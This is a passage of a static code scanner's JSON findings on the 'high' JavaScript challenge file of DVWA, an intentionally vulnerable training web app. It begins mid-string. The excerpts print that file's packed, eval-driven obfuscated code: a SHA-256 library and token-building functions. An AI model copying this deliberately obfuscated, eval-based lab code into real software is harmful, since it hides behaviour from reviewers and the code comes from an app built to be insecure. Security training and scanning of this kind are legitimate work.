+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 7851,
        "endLocationLine": 1,
        "endLocationColumn": 7855
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI009000",
        "ruleName": "Cryptography: Hash Algorithm (Misc)",
        "ruleDescription": "Cryptography: Hash Algorithm (Misc)",
        "pattern": "RIPEMD|Blowfish|Twofish|Threefish|Serpent|HMAC|KeyedHashAlgorithm",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Misc"
        ],
        "sample": "Hmac",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x